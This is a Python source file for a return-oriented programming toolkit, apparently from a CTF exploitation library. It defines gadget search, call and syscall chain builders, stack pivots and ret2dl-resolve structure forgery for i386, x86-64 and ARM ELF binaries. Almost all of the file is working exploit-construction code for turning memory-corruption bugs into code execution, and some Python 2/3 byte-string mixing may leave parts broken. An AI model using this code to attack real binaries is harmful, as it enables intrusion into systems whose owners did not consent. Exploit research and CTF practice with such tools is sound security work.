from ..loaders.elf import *
import random
from ..misc.packing import *


def int16(x):
    if isinstance(x, (list, tuple)):
        return [int(n, 16) for n in x]
    else:
        return int(x, 16)

def p32(x):
    if isinstance(x, str):
        return struct.unpack('<I', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('I'*len(x)), *x)
    else:
        return struct.pack('<I', x)

def p64(x):
    if isinstance(x, str):
        return struct.unpack('<Q', x)[0]
    elif isinstance(x, (list, tuple)):
        return struct.pack('<' + ('Q'*len(x)), *x)
    else:
        return struct.pack('<Q', x)


class ROP(ELF):
    def __init__(self, *args, **kwargs):
        ELF.__init__(self, *args, **kwargs)
        if self.arch == 'i386':
            self.__class__ = type('ROP_I386', (ROP_I386,), {})
        elif self.arch == 'x86-64':
            self.__class__ = type('ROP_X86_64', (ROP_X86_64,), {})
        elif self.arch == 'arm':
            self.__class__ = type('ROP_ARM', (ROP_ARM,), {})
        else:
            raise Exception("unknown architecture: %r" % self.arch)

    def p(self, x):
        if self.wordsize == 8:
            return p64(x)
        else:
            return p32(x)

    def gadget(self, s):
        return self.search(s, xonly=True)

    def string(self, s):
        return s + '\x00'

    def junk(self, n=1):
        return self.fill(self.wordsize * n)

    def fill(self, size, buf=''):
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        return b''.join(random.choice(chars).encode("utf-8") for i in range(buflen))

    def align(self, addr, origin, size):
        padlen = size - ((addr-origin) % size)
        return (addr+padlen, padlen)

    def load(self, blob, base=0):
        self._load_blobs += [(base, blob, True)]

    def scan_gadgets(self, regexp):
        for virtaddr, blob, is_executable in self._load_blobs:
            if not is_executable:
                continue

            for m in re.finditer(regexp, blob):
                if self.arch == 'arm':
                    arch = 'thumb'
                else:
                    arch = self.arch
                p = Popen(Asm.cmd[arch]['objdump_binary'] + ["--adjust-vma=%d" % virtaddr, "--start-address=%d" % (virtaddr+m.start()), self.fpath], stdout=PIPE)
                stdout, stderr = p.communicate()

                lines = stdout.splitlines()[7:]
                if '\t(bad)' in lines[0]:
                    continue

                for line in lines:
                    print(line)
                    if re.search(r'\t(?:ret|jmp|\(bad\)|; <UNDEFINED> instruction|\.\.\.)', line):
                        print('-' * 80)
                        break

    def list_gadgets(self):
        raise NotImplementedError("not implemented for this architecture: %r" % self.arch)


class ROP_I386(ROP):
    regs = ['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi']

    def gadget(self, keyword, reg=None, n=1):
        def regexp_or(*args):
            return re.compile('(?:' + '|'.join(map(re.escape, args)) + ')')

        table = {
            'pushad': '\x60\xc3',
            'popad': '\x61\xc3',
            'leave': '\xc9\xc3',
            'ret': '\xc3',
            'int3': '\xcc',
            'int80': '\xcd\x80',
            'call_gs10': '\x65\xff\x15\x10\x00\x00\x00',
            'syscall': '\x0f\x05',
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        if reg:
            try:
                r = self.regs.index(reg)
            except ValueError:
                raise Exception("unexpected register: %r" % reg)
        else:
            r = self.regs.index('esp')

        if keyword == 'pop':
            if reg:
                chunk1 = chr(0x58+r) + '\xc3'
                chunk2 = '\x8f' + chr(0xc0+r) + '\xc3'
                return self.search(regexp_or(chunk1, chunk2), xonly=True)
            else:
                # skip esp
                return self.search(re.compile(r"(?:[\x58-\x5b\x5d-\x5f]|\x8f[\xc0-\xc3\xc5-\xc7]){%d}\xc3" % n), xonly=True)
        elif keyword == 'call':
            chunk = '\xff' + chr(0xd0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'jmp':
            chunk = '\xff' + chr(0xe0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'jmp_ptr':
            chunk = '\xff' + chr(0x20+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'push':
            chunk1 = chr(0x50+r) + '\xc3'
            chunk2 = '\xff' + chr(0xf0+r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'pivot':
            # chunk1: xchg REG, esp
            # chunk2: xchg esp, REG
            if r == 0:
                chunk1 = '\x94\xc3'
            else:
                chunk1 = '\x87' + chr(0xe0+r) + '\xc3'
            chunk2 = '\x87' + chr(0xc4+8*r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'loop':
            chunk1 = '\xeb\xfe'
            chunk2 = '\xe9\xfb\xff\xff\xff'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        else:
            # search directly
            return ROP.gadget(self, keyword)

    def call(self, addr, *args):
        if isinstance(addr, str):
            addr = self.plt[addr]

        buf = self.p(addr)
        buf += self.p(self.gadget('pop', n=len(args)))
        buf += self.p(args)
        return buf

    def call_chain_ptr(self, *calls, **kwargs):
        raise Exception('support x86-64 only')

    def dl_resolve_data(self, base, name):
        jmprel = self.dynamic('JMPREL')
        relent = self.dynamic('RELENT')
        symtab = self.dynamic('SYMTAB')
        syment = self.dynamic('SYMENT')
        strtab = self.dynamic('STRTAB')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
        addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)
        addr_symstr = addr_sym + syment

        r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
        st_name = addr_symstr - strtab

        buf = self.fill(padlen_reloc)
        buf += struct.pack('<II', base, r_info)                      # Elf32_Rel
        buf += self.fill(padlen_sym)
        buf += struct.pack('<IIII', st_name, 0, 0, 0x12)             # Elf32_Sym
        buf += self.string(name)

        return buf

    def dl_resolve_call(self, base, *args):
        jmprel = self.dynamic('JMPREL')
        relent = self.dynamic('RELENT')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)
        reloc_offset = addr_reloc - jmprel

        buf = self.p(self.plt())
        buf += self.p(reloc_offset)
        buf += self.p(self.gadget('pop', n=len(args)))
        buf += self.p(args)

        return buf

    def syscall(self, number, *args):
        try:
            arg_regs = ['ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
            buf = self.p([self.gadget('pop', 'eax'), number])
            print(buf)
            for arg_reg, arg in zip(arg_regs, args):
                buf += self.p([self.gadget('pop', arg_reg), arg])
        except ValueError:
            # popad = pop edi, esi, ebp, esp, ebx, edx, ecx, eax
            args = list(args) + [0] * (6-len(args))
            buf = self.p([self.gadget('popad'), args[4], args[3], args[5], 0, args[0], args[2], args[1], number])
        buf += self.p(self.gadget('int80'))
        return buf

    def pivot(self, rsp):
        buf = self.p([self.gadget('pop', 'ebp'), rsp-self.wordsize])
        buf += self.p(self.gadget('leave'))
        return buf

    def retfill(self, size, buf=''):
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        s = self.fill(buflen % self.wordsize)
        s += self.p(self.gadget('ret')) * (buflen // self.wordsize)
        return s

    def list_gadgets(self):
        print("%8s" % 'pop',)
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print("\033[32m%d\033[m" % (i+1),)
            except ValueError:
                print("\033[31m%d\033[m" % (i+1),)
        for keyword in ['pop', 'jmp', 'jmp_ptr', 'call', 'push', 'pivot']:
            print("%8s" % keyword,)
            for reg in self.regs:
                try:
                    self.gadget(keyword, reg)
                    print("\033[32m%s\033[m" % reg,)
                except ValueError:
                    print("\033[31m%s\033[m" % reg,)

        print("%8s" % 'etc',)
        for keyword in ['pushad', 'popad', 'leave', 'ret', 'int3', 'int80', 'call_gs10', 'syscall', 'loop']:
            try:
                self.gadget(keyword)
                print("\033[32m%s\033[m" % keyword,)
            except ValueError:
                print("\033[31m%s\033[m" % keyword,)

class ROP_X86_64(ROP):
    regs = ['rax', 'rcx', 'rdx', 'rbx', 'rsp', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']

    def gadget(self, keyword, reg=None, n=1):
        def regexp_or(*args):
            return re.compile('(?:' + '|'.join(map(re.escape, args)) + ')')

        table = {
            'leave': '\xc9\xc3',
            'ret': '\xc3',
            'int3': '\xcc',
            'int80': '\xcd\x80',
            'call_gs10': '\x65\xff\x15\x10\x00\x00\x00',
            'syscall': '\x0f\x05',
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        if reg:
            try:
                r = self.regs.index(reg)
                need_prefix = bool(r >= 8)
                if need_prefix:
                    r -= 8
            except ValueError:
                raise Exception("unexpected register: %r" % reg)
        else:
            r = self.regs.index('rsp')
            need_prefix = False

        if keyword == 'pop':
            if reg:
                prefix = '\x41' if need_prefix else ''
                chunk1 = prefix + chr(0x58+r) + '\xc3'
                chunk2 = prefix + '\x8f' + chr(0xc0+r) + '\xc3'
                return self.search(regexp_or(chunk1, chunk2), xonly=True)
            else:
                # skip rsp
                return self.search(re.compile(r"(?:[\x58-\x5b\x5d-\x5f]|\x8f[\xc0-\xc3\xc5-\xc7]|\x41(?:[\x58-\x5f]|\x8f[\xc0-\xc7])){%d}\xc3" % n), xonly=True)
        elif keyword == 'call':
            prefix = '\x41' if need_prefix else ''
            chunk = prefix + '\xff' + chr(0xd0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'jmp':
            prefix = '\x41' if need_prefix else ''
            chunk = prefix + '\xff' + chr(0xe0+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'jmp_ptr':
            prefix = '\x41' if need_prefix else ''
            chunk = prefix + '\xff' + chr(0x20+r)
            return self.search(chunk, xonly=True)
        elif keyword == 'push':
            prefix = '\x41' if need_prefix else ''
            chunk1 = prefix + chr(0x50+r) + '\xc3'
            chunk2 = prefix + '\xff' + chr(0xf0+r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'pivot':
            # chunk1: xchg REG, rsp
            # chunk2: xchg rsp, REG
            if need_prefix:
                chunk1 = '\x49\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = '\x4c\x87' + chr(0xc4+8*r) + '\xc3'
            else:
                if r == 0:
                    chunk1 = '\x48\x94\xc3'
                else:
                    chunk1 = '\x48\x87' + chr(0xe0+r) + '\xc3'
                chunk2 = '\x48\x87' + chr(0xc4+8*r) + '\xc3'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        elif keyword == 'loop':
            chunk1 = '\xeb\xfe'
            chunk2 = '\xe9\xfb\xff\xff\xff'
            return self.search(regexp_or(chunk1, chunk2), xonly=True)
        else:
            # search directly
            return ROP.gadget(self, keyword)

    def call(self, addr, *args):
        if isinstance(addr, str):
            addr = self.plt(addr)

        regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9']
        buf = ''
        for i, arg in enumerate(args):
            buf += self.p([self.gadget('pop', regs[i]), arg])
        buf += self.p(addr)
        buf += self.p(args[6:])
        return buf

    def call_chain_ptr(self, *calls, **kwargs):
        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            # Ubuntu clang version 3.0-6ubuntu3 (tags/RELEASE_30/final) (based on LLVM 3.0)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-4)
            ('\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x72\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', False),
            # gcc 4.8.2-19ubuntu1
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x8b\x5c\x24\x08\x48\x8b\x6c\x24\x10\x4c\x8b\x64\x24\x18\x4c\x8b\x6c\x24\x20\x4c\x8b\x74\x24\x28\x4c\x8b\x7c\x24\x30\x48\x83\xc4\x38\xc3', True),
            # gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2
            ('\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea', '\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3', True),
        ]

        for chunk1, chunk2, _args_reversed in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_ptr = self.gadget(chunk1 + chunk2)
                args_reversed = _args_reversed
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = self.p(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')
            elif args[1] >= (1<<32):
                raise Exception("1st argument should be less than 2^32: %x" % args[1])

            ptr = args.pop(0)
            if isinstance(ptr, str):
                ptr = self.got(ptr)

            buf += self.junk()
            buf += self.p([0, 1, ptr])
            if not args_reversed:
                for arg in args:
                    buf += self.p(arg)
                buf += self.p(0) * (3-len(args))
            else:
                buf += self.p(0) * (3-len(args))
                for arg in reversed(args):
                    buf += self.p(arg)
            buf += self.p(call_ptr)

        buf += self.junk()
        if 'pivot' in kwargs:
            buf += self.p(0)
            buf += self.p(kwargs['pivot'] - self.wordsize)
            buf += self.p(0) * 4
            buf += self.p(self.gadget('leave'))
        else:
            buf += self.p(0) * 6
        return buf

    def dl_resolve_data(self, base, name):
        jmprel = self.dynamic('JMPREL')
        relaent = self.dynamic('RELAENT')
        symtab = self.dynamic('SYMTAB')
        syment = self.dynamic('SYMENT')
        strtab = self.dynamic('STRTAB')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
        addr_sym, padlen_sym = self.align(addr_reloc+relaent, symtab, syment)
        addr_symstr = addr_sym + syment

        r_info = (((addr_sym - symtab) / syment) << 32) | 0x7
        st_name = addr_symstr - strtab

        buf = self.fill(padlen_reloc)
        buf += struct.pack('<QQQ', base, r_info, 0)                  # Elf64_Rela
        buf += self.fill(padlen_sym)
        buf += struct.pack('<IIQQ', st_name, 0x12, 0, 0)             # Elf64_Sym
        buf += self.string(name)

        return buf

    def dl_resolve_call(self, base, *args):
        # prerequisite:
        # 1) overwrite (link_map + 0x1c8) with NULL
        # 2) set registers for arguments
        if args:
            raise Exception('arguments must be set to the registers beforehand')

        jmprel = self.dynamic('JMPREL')
        relaent = self.dynamic('RELAENT')

        addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)
        reloc_offset = (addr_reloc - jmprel) / relaent

        buf = self.p(self.plt())
        buf += self.p(reloc_offset)

        return buf

    def syscall(self, number, *args):
        arg_regs = ['rdi', 'rsi', 'rdx', 'r10', 'r8', 'r9']
        buf = self.p([self.gadget('pop', 'rax'), number])
        for arg_reg, arg in zip(arg_regs, args):
            buf += self.p([self.gadget('pop', arg_reg), arg])
        buf += self.p(self.gadget('syscall'))
        return buf

    def pivot(self, rsp):
        buf = self.p([self.gadget('pop', 'rbp'), rsp-self.wordsize])
        buf += self.p(self.gadget('leave'))
        return buf

    def retfill(self, size, buf=''):
        buflen = size - len(buf)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        s = self.fill(buflen % self.wordsize)
        s += self.p(self.gadget('ret')) * (buflen // self.wordsize)
        return s

    def list_gadgets(self):
        print("%8s" % 'pop',)
        for i in range(6):
            try:
                self.gadget('pop', n=i+1)
                print("\033[32m%d\033[m" % (i+1),)
            except ValueError:
                print("\033[31m%d\033[m" % (i+1),)
        for keyword in ['pop', 'jmp', 'jmp_ptr', 'call', 'push', 'pivot']:
            print("%8s" % keyword,)
            for reg in self.regs:
                try:
                    self.gadget(keyword, reg)
                    print("\033[32m%s\033[m" % reg,)
                except ValueError:
                    print("\033[31m%s\033[m" % reg,)

        print("%8s" % 'etc',)
        for keyword in ['leave', 'ret', 'int3', 'int80', 'call_gs10', 'syscall', 'loop']:
            try:
                self.gadget(keyword)
                print("\033[32m%s\033[m" % keyword,)
            except ValueError:
                print("\033[31m%s\033[m" % keyword,)

class ROP_ARM(ROP):
    def pt(self, x):
        if isinstance(x, str):
            return (self(x) | 1)
        else:
            return self.p(x | 1)

    def gadget(self, keyword, reg=None, n=1):
        table = {
            'pivot_r7': '\xbd\x46\x80\xbd',                  # mov sp, r7; pop {r7, pc}
            'pivot_fp': '\x0b\xd0\xa0\xe1\x00\x88\xbd\xe8',  # mov sp, fp; pop {fp, pc}
            'pop_r0_3fp': '\xbd\xe8\x0f\x88',                # ldmia.w sp!, {r0, r1, r2, r3, fp, pc}
            'pop_r4_7': '\xf0\xbd',                          # pop {r4, r5, r6, r7, pc}
            'svc0': '\x00\xdf',                              # svc 0
        }
        if keyword in table:
            return self.search(table[keyword], xonly=True)

        # search directly
        return ROP.gadget(self, keyword)

    def call_chain(self, *calls, **kwargs):
        gadget_candidates = [
            # gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
            ('\x30\x46\x39\x46\x42\x46\x01\x34\x98\x47\x4c\x45\xf6\xd1', '\xbd\xe8\xf8\x83', True),
            # gcc (Ubuntu/Linaro 4.8.2-19ubuntu1) 4.8.2
            ('\x38\x46\x41\x46\x4a\x46\x98\x47\xb4\x42\xf6\xd1', '\xbd\xe8\xf8\x83', False),
        ]

        for chunk1, chunk2, _is_4_6 in gadget_candidates:
            try:
                set_regs = self.gadget(chunk2)
                call_reg = self.gadget(chunk1 + chunk2)
                is_4_6 = _is_4_6
                break
            except ValueError:
                pass
        else:
            raise Exception('gadget not found')

        buf = self.pt(set_regs)

        for args in calls:
            if len(args) > 4:
                raise Exception('4th argument and latter should be set in advance')

            addr = args.pop(0)
            if isinstance(addr, str):
                addr = self.plt(addr)

            if is_4_6:
                buf += self.p(addr)
                buf += self.p([0, 0])
                for arg in args:
                    buf += self.p(arg)
                buf += self.p(0) * (3-len(args))
                buf += self.p(1)
                buf += self.pt(call_reg)
            else:
                buf += self.p(addr)
                buf += self.p([0, 0, 0])
                for arg in args:
                    buf += self.p(arg)
                buf += self.p(0) * (3-len(args))
                buf += self.pt(call_reg)

        if 'pivot' in kwargs:
            try:
                pivot_r7 = self.gadget('pivot_r7')
                buf += self.p(0) * 4
                buf += self.p(kwargs['pivot'] - self.wordsize)
                buf += self.p(0) * 2
                buf += self.pt(pivot_r7)
            except ValueError:
                buf += self.p(0) * 7
                buf += self.pivot(kwargs['pivot'])
        else:
            buf += self.p(0) * 7
        return buf

    def syscall(self, number, *args):
        args0_3, args4_6 = args[:4], args[4:7]

        buf = self.pt(self.gadget('pop_r0_3fp'))
        for arg in args0_3:
            buf += self.p(arg)
        buf += self.p(0) * (4-len(args0_3))
        buf += self.p(0)
        buf += self.pt(self.gadget('pop_r4_7'))
        for arg in args4_6:
            buf += self.p(arg)
        buf += self.p(0) * (3-len(args4_6))
        buf += self.p(number)
        buf += self.pt(self.gadget('svc0'))

        return buf

    def pivot(self, rsp):
        try:
            addr = self.gadget('pivot_r7')
            return self.p([addr+2, rsp-self.wordsize, addr])
        except ValueError:
            addr = self.gadget('pivot_fp')
            return self.p([addr+4, rsp-self.wordsize, addr])

    def list_gadgets(self):
        print("%8s" % 'pivot',)
        for keyword in ['pivot_r7', 'pivot_fp']:
            try:
                self.gadget(keyword)
                print("\033[32m%s\033[m" % keyword,)
            except ValueError:
                print("\033[31m%s\033[m" % keyword,)
        print("%8s" % 'syscall',)
        for keyword in ['pop_r0_3fp', 'pop_r4_7', 'svc0']:
            try:
                self.gadget(keyword)
                print("\033[32m%s\033[m" % keyword,)
            except ValueError:
                print("\033[31m%s\033[m" % keyword,)
